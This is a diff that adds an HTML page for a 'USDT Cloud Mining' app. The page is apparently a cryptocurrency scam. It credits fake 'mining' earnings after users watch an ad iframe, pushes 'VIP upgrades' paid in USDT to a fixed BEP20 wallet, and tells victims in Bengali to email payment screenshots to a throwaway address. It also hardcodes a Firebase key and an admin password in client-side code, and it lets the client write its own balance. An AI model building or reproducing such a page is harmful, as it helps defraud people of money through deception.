@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USDT Cloud Mining - Live</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-app.js";
+        import { getDatabase, ref, set, onValue, update } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBIM8Rp8REYjdPHZegCYBF5ikW6Xdcqeg4",
+            authDomain: "usdt-72320.firebaseapp.com",
+            projectId: "usdt-72320",
+            databaseURL: "https://usdt-72320-default-rtdb.firebaseio.com",
+            storageBucket: "usdt-72320.firebasestorage.app",
+            messagingSenderId: "7688156181",
+            appId: "1:7688156181:web:675b7e1c4c37788f27ca1c"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        // Global DB variable
+        window.userDb = db;
+        window.dbFuncs = { ref, set, onValue, update };
+    </script>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap');
+        body { font-family: 'Outfit', sans-serif; background: #010409; color: white; }
+        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 28px; }
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.96); z-index: 100; align-items: center; justify-content: center; padding: 20px; backdrop-filter: blur(10px); }
+        .gradient-cyan { background: linear-gradient(135deg, #22d3ee, #0ea5e9); }
+    </style>
+</head>
+<body onload="waitForFirebase()">
+
+    <div id="loader" class="fixed inset-0 bg-[#010409] z-[200] flex flex-col items-center justify-center">
+        <div class="w-16 h-16 border-4 border-cyan-500/20 border-t-cyan-500 rounded-full animate-spin"></div>
+    </div>
+
+    <div id="app" class="max-w-md mx-auto hidden pb-24 px-5">
+        <div class="flex justify-between items-center py-8">
+            <div>
+                <p class="text-[10px] text-gray-500 uppercase tracking-widest font-bold">Node ID</p>
+                <h2 class="text-white font-bold text-sm">#<span id="uId">000000</span></h2>
+            </div>
+            <div id="vTag" class="px-4 py-1.5 bg-white/5 border border-white/10 rounded-full text-[10px] font-bold text-gray-400 uppercase">Standard</div>
+        </div>
+
+        <div class="glass p-8 text-center mb-6">
+            <p class="text-gray-500 text-xs font-semibold uppercase tracking-widest mb-2">Earnings Balance</p>
+            <h1 id="mainBal" class="text-4xl font-bold tracking-tighter">0.00</h1>
+            <div class="flex gap-4 mt-8">
+                <button onclick="openModal('vipModal')" class="flex-1 gradient-cyan text-black font-bold py-3.5 rounded-2xl text-[10px] uppercase">Upgrade VIP</button>
+            </div>
+        </div>
+
+        <div class="mt-10 mb-10 flex justify-center">
+            <div onclick="startMining()" class="w-56 h-56 rounded-full glass flex flex-col items-center justify-center cursor-pointer transition-all active:scale-90 border-2 border-cyan-500/20">
+                <i class="fas fa-bolt text-4xl text-cyan-400 animate-pulse mb-3"></i>
+                <p class="text-xs font-bold text-white"><span id="mCount">10</span>/10 Attempts</p>
+            </div>
+        </div>
+
+        <div class="mt-20 text-center opacity-10">
+            <button onclick="adminEntry()" class="text-[8px] tracking-[1em]">TERMINAL</button>
+        </div>
+    </div>
+
+    <div id="depositModal" class="modal">
+        <div class="glass p-8 w-full max-w-sm text-center">
+            <div id="payDetails">
+                <h2 class="text-lg font-bold mb-4">Deposit USDT (BEP20)</h2>
+                <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=0x92b80251BF9960170537B361d5f45589f4Ac02e6" class="bg-white p-2 rounded-xl mx-auto mb-4 w-32">
+                <p class="text-[9px] text-gray-500 mb-2">Send Exactly <span id="payAmount" class="text-white">0.00</span> USDT</p>
+                <div class="bg-black/50 p-3 rounded-xl border border-white/10 text-[8px] break-all mb-6 font-mono">0x92b80251BF9960170537B361d5f45589f4Ac02e6</div>
+                <button onclick="showThankYou()" class="w-full gradient-cyan text-black py-4 rounded-2xl font-bold uppercase text-[10px] mb-3">CONFIRM DEPOSIT</button>
+                <button onclick="closeModal('depositModal')" class="w-full text-xs text-gray-600">Cancel</button>
+            </div>
+            <div id="thankYouMsg" class="hidden text-left">
+                <h2 class="text-xl font-bold mb-4 text-center text-cyan-400">Next Step</h2>
+                <p class="text-[11px] text-gray-300 leading-relaxed mb-4">USDT ডিপোজিট করার পর ট্রানজেকশন এর একটি স্ক্রিন সট নিন এবং <span class="font-bold text-white">lafex44299@proadech.com</span> এই মেইলে পাঠান।</p>
+                <p class="text-[11px] bg-white/5 p-4 rounded-2xl border border-white/10 text-yellow-500 italic">সঠিক তথ্য থাকলে আপনার VIP Level টি ১-২ দিনের ভিতর আপডেট হবে।</p>
+                <button onclick="closeModal('depositModal');" class="w-full mt-6 bg-white/10 py-3 rounded-xl text-xs font-bold uppercase">Done</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="adModal" class="modal !p-0">
+        <div class="w-full h-full flex flex-col bg-black">
+            <div class="p-6 flex justify-between items-center bg-[#010409]">
+                <span id="timer" class="text-3xl font-bold text-cyan-400 font-mono">08</span>
+                <p class="text-[10px] text-red-500 uppercase font-bold">Node Syncing...</p>
+            </div>
+            <iframe id="adFrame" src="" class="w-full flex-grow"></iframe>
+        </div>
+    </div>
+
+    <script>
+        let currentUser = { id: 0, bal: 0.00, tier: "Standard", m: 10 };
+
+        function waitForFirebase() {
+            if (window.userDb) initApp();
+            else setTimeout(waitForFirebase, 500);
+        }
+
+        async function initApp() {
+            let localId = localStorage.getItem('_usr_id');
+            if(!localId) {
+                localId = Math.floor(100000 + Math.random() * 900000);
+                localStorage.setItem('_usr_id', localId);
+            }
+
+            const { ref, onValue, set } = window.dbFuncs;
+            const userRef = ref(window.userDb, 'users/' + localId);
+
+            onValue(userRef, (snapshot) => {
+                const data = snapshot.val();
+                if(data) {
+                    currentUser = data;
+                } else {
+                    currentUser.id = parseInt(localId);
+                    set(userRef, currentUser);
+                }
+                updateUI();
+                document.getElementById('loader').style.display='none';
+                document.getElementById('app').style.display='block';
+            });
+        }
+
+        function updateUI() {
+            document.getElementById('uId').innerText = currentUser.id;
+            document.getElementById('mainBal').innerText = currentUser.bal.toFixed(2);
+            document.getElementById('vTag').innerText = currentUser.tier;
+            document.getElementById('mCount').innerText = currentUser.m;
+        }
+
+        function startMining() {
+            if(currentUser.m <= 0) return alert("Daily Limit Reached!");
+            document.getElementById('adFrame').src = "https://omg10.com/4/10714152";
+            openModal('adModal');
+            let s = 8;
+            let i = setInterval(() => {
+                s--; document.getElementById('timer').innerText = s < 10 ? "0"+s : s;
+                if(s <= 0) { clearInterval(i); finishMining(); }
+            }, 1000);
+        }
+
+        function finishMining() {
+            closeModal('adModal');
+            let reward = currentUser.tier.includes('SILVER') ? 0.70 : currentUser.tier.includes('GOLD') ? 1.00 : currentUser.tier.includes('DIAMOND') ? 1.50 : 0.05;
+            currentUser.bal += reward; currentUser.m--;
+            
+            const { ref, update } = window.dbFuncs;
+            update(ref(window.userDb, 'users/' + currentUser.id), { bal: currentUser.bal, m: currentUser.m });
+        }
+
+        function showDeposit(amt) { document.getElementById('payAmount').innerText = amt; openModal('depositModal'); }
+        function showThankYou() { document.getElementById('payDetails').classList.add('hidden'); document.getElementById('thankYouMsg').classList.remove('hidden'); }
+        function openModal(id) { document.getElementById(id).style.display = 'flex'; }
+        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
+        function adminEntry() { if(prompt("Key:") === "1896212378") alert("Admin system ready for next sync."); }
+    </script>
+</body>
+</html>
